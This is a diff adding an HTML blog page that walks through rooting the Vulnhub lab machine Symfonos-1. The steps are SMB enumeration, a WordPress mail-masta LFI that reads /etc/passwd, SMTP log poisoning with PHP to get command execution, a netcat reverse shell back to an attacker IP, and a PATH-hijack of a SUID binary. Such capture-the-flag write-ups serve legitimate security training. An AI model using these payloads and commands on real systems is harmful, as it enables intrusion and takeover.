@@ -1,0 +1,159 @@
+<html>
+<head>
+    <title>I Am Rushi</title>
+    <link rel="shortcut icon" type="image/x-icon" href="../images/favicon.ico">
+    <link rel="stylesheet" href="../style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Ubuntu+Mono" />
+</head>
+<body>
+
+    <div class="posts">
+        <div class="posts">
+            <p>Latest Posts</p>
+        </div>
+    </div>
+    
+<div class="content" id="content">
+    <div class="blog-nmap">
+
+        <h1>Symfonos - Vulnhub</h1>
+        <p style="font-size: 9px; color: lightgreen; margin-top: -1vh; margin-bottom: 3vh;">Uploaded : Sept 06 2021</p>
+        <p style="color: #59ff00;"><b>Defficulty: Easy</b></p>
+        <p>Hi guys!, so tody we are gonna root a very easy machine from vulnhub which is Symfonos-1, Symfonos is a series of machines in which there are total 4 to 5 machine and we are going to root all of them in upcomming writeup's, so let's hunt the ROOT!<p>
+
+        <h2>Host Discovery</h2>
+        <p>To find the IP of target machine i am going to use nmap or we can use netdiscovery also depends on your choice but i'll recommend nmap because it is so accurate.</p>
+        <img src="images/symfonos.png">
+
+        <h2>Nmap Scan</h2>
+        <p>After that we need to scan the target machine so for that i am using(nmap) a basic scan method which is default scripts, enum all versions, all ports and output all formats. If you dont know Nmap scanning commands then i'll recommend to read my previous <a href="../blogs/nmap.html" style="color: indianred;">blog on nmap.</a></p>
+
+        <p style="font-weight: bold;">Command:</p>
+        <p style="margin-left: 12vh;color: lightgreen;">sudo nmap -sC -sV -p- -T4 192.168.0.105 -oA nmap/all-port</p>
+        <p>So the scanning is done and we can see the results in the image below.</p>
+        <img src="images/symfonos_2.png" style="">
+        <p>Here we can see port 22,25,80,139,445 are open, so first of all let's look at port 80 which is a webpage, but before that we need to add domain name which is <b>symfonos.local</b> in our hosts file as show in the image.</p>
+        <img src="images/symfonos_1.png">
+
+        <h2>Web Enumeration</h2>
+        <p>As shown in the image below we can see there is nothing much intreasting in the webpage and in the source code.</p>
+        <img src="images/symfonos_3.png" style="width: 50%;">
+        <p>Let's try to brute force web directories on by using go buster and as we can see in the image there is only one directory which is /manual and again nothing much intreasting just a apache manual we can try to brute force username and password but lets do some more enumuration.</p>
+        <p style="font-weight: bold;">Gobuster:</p>
+        <img src="images/symfonos_5.png">
+
+        <h2>SMB Shares Enumeration</h2>
+        <p>Previously in our Nmap scan we found ports 139&445 were open so let's use <b>lin4enum</b> to enumerate smb shares.</p>
+        <p style="font-weight: bold;">Command:</p>
+        <p style="margin-left: 12vh;color: lightgreen;">lin4enum 192.168..0.105</p>
+        <p>So as we can see in the result image below we found 2 main shares helios and anonymous, helios is read-only which means we need password for that but we can connect to anonymous without password, so let's try that.</p>
+        <img src="images/symfonos_6.png">
+        <p>After connecting to anonymous i found a text file. So we can use get command to download file in our current directory as shown in the image below.</p>
+        <img src="images/symfonos_7.png">
+        <p>Looking inside the attention.txt i found some passwords.</p>
+        <img src="images/symfonos_8.png">
+        <p>So lets try this passwords to connect to helios share, and as we can see in the image, we can connected to helios share so here again i found 2 text files lets grap that with get command.</p>
+        <img src="images/symfonos_9.png">
+        <p>After looking inside both the file i found web directory name inside todo.txt. So lets visit to http://192.168.0.105/h3l105</p>
+        <img src="images/symfonos_10.png">
+        <h2>Wpscan</h2>
+        <p>So as we can see in the image that this is a normal wordpress website, so whenever the word "wordpress" comes immediately scan that website with wpscan.</p>
+        <img src="images/symfonos_11.png" style="width: 50%;">
+        <p style="font-weight: bold;">Command:</p>
+        <p style="margin-left: 12vh;color: lightgreen;">wpscan --url http://192.168.0.105/h3l105/ --enumerate p<br>
+        --url = to specify url of target site</br>--enumerate p = to enumerate all installed plugins </p>
+        <p>As we can see in the image below our wpscan found a vulnerable plugin which is installed on this website.</p>
+        <img src="images/symfonos_13.png">
+        <p>So as we can see in the image below the plugin mail-masta is vulnerable LFI (local file inclusion) and our searchsploit has found exploit for it so lets copy that exploit to our current directory. To do that use this command.</p>
+        <p style="font-weight: bold;">Command:</p>
+        <p style="margin-left: 12vh;color: lightgreen;">searchsploit -m [path of exploit]</p>
+        <img src="images/symfonos_14.png">
+        <p>The exploit file gives us the exact path from where we can permorm local file inclusion. As shown in the image below.</p>
+        <p style="font-weight: bold;">LFI path:</p>
+        <p style="margin-left: 12vh;color: lightgreen;">http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</p>
+        <img src="images/symfonos_15.png" style="width: 50%;">
+        <p>and as we can see it is working Great!.</p>
+        <img src="images/symfonos_16.png" style="width: 50%;">
+        <h2>LFI to RCE</h2>
+        <p>Ok so to convert this LFI into RCE we can try to poison apache2 logs but in our case we dont have permissions to read apache logs, so we know that port 25 is open which is SMTP (mail server) we can try to access smtp mail logs and try to poison it, to do so we need to go to the <b>/var/mail/helios.</b> Why helios?, because we know only one username which is helios and if this helios is using SMTP mail server then then there will be logs for that.</p>
+        <img src="images/symfonos_17.png" style="width: 50%;">
+        <p>As shown in the image above we can see that we can access the mail logs so lets try to poison it, do to so we need to connect to port 25(SMTP) with telnet and then inject a php command.</p>
+        <img src="images/symfonos_19.png">
+        <p>OK so we sucessfully injected php shell inside mail logs and as shown in the image below we can now execute commands.</p>
+        <img src="images/symfonos_20.png" >
+        <p>Here i am using netcat to get a reverse shell on our machine to do so use this command.</p>
+        <p style="font-weight: bold;">Command:</p>
+        <p style="margin-left: 12vh;color: lightgreen;">nc -e "/bin/bash" [attacker ip] [port]</p>
+        <img src="images/symfonos_23.png">
+        <p>Now are in so first of all lets spawn a python pty shell. To use clear command we need to export TERM veriable to xterm as shown in the command blow.</p>
+        <p style="font-weight: bold;">Command:</p>
+        <p style="margin-left: 12vh;color: lightgreen;">python3 -c 'import pty;pty.spawn("/bin/bash")'<br>export TERM=xterm (to use clear command)</br></p>
+        <h2>ROOT Access</h2>
+        <p>We own the user now but we dont have permission to see root files so we need to get root access. I tried to look inside helios home directory but nothing much intreasting.</p>
+        <img src="images/symfonos_24.png">
+        <p>Now let's try to enumerate SUID binaries with the help of find command.</p>
+        <p style="font-weight: bold;">Command:</p>
+        <p style="margin-left: 12vh;color: lightgreen;">find / -per -u=s -type f 2>/dev/null</p>
+        <img src="images/symfonos_26.png">
+        <p>So i found a SUID binary which we can run as a root user. we can reverse that binary to get root access to do so 1st we need to look inside that binary and understand exactly what is happning after we run that binary.</p> 
+        <img src="images/symfonos_27.png">
+        <p>as we cann see in the image above i used strings command to look inside our binary and i found that after running it is running another executable which is curl but the exact path of curl is not defined in it so we can spoof the path.</p>
+        <img src="images/symfonos_30.png">
+        <p>as shown in this image i made another curl executable in tmp folder and put a root bash shell inside that so if our fake curl executable is run as a root then we will directly spawn to a root shell.</p>
+        <img src="images/symfonos_29.png">
+        <p>So after spoofing the path to our fake curl exec path we are ready to run that suid binary which is <b>/opt/statuscheck.</b></p>
+        <img src="images/symfonos_31.png">
+        <p>and as we can see in the image above, we got the root shell which means we sucessfully ROOTED this machine!</p>
+        <br></br>
+        <hr style="margin-left: 8vh;">
+    </div>
+    <div class="right">
+        <p>@2021<a href="https://twitter.com/Rushi0x04T7"> Rushi0x04T7. </a>Some rights reserved.</p>
+    </div>
+</div>
+
+<nav id="sideNav">
+        <ul>
+            <!-- <p><a href="../index.html">iamrushi.cf</a></p> -->
+            <a href="../main.html"><img src="../images/home.png"></a>
+            <a href="../blogs.html"><img src="../images/blogs.png"></a>
+            <a href="../writeups.html"><img src="../images/writeups.png"></a>
+            <a href="../projects.html"><img src="../images/projects.png"></a>
+            <a href="../about.html"><img src="../images/about.png"></a>
+            <li><a href="../main.html">HOME</a></li>
+            <li><a href="../blogs.html">BLOGS</a></li>
+            <li><a href="../writeups.html">WRITEUPS</a></li>
+            <li><a href="../projects.html">PROJECTS</a></li>
+            <li><a href="../about.html">ABOUT</a></li>
+        </ul>
+    <div class="media">
+        <a href="https://github.com/Rushi-0"><img src="../images/github.png"></a>
+        <a href="https://twitter.com/Rushi0x04T7"><img src="../images/twitter.png"></a>
+        <a href="https://www.instagram.com/rushi.d4runt3/"><img src="../images/instagram.png"></a>
+        <a href="https://www.iamrushi.cf/"><img src="../images/website.png"></a>
+    </div>
+</nav>
+
+    <img src="../images/menu.png" id="menuBtn">
+
+    <script>
+        var menuBtn = document.getElementById("menuBtn");
+        var sideNav = document.getElementById("sideNav");
+
+        sideNav.style.left = "-250px";
+        menuBtn.style.left = "5px"
+        menuBtn.onclick = function(){
+            if(sideNav.style.left == "-250px"){
+                sideNav.style.left = "0";
+                menuBtn.style.left = "150px"
+            }
+            else{
+                sideNav.style.left = "-250px";
+                menuBtn.style.left = "5px"
+            }
+        }
+    </script>
+
+</body>
+</html>
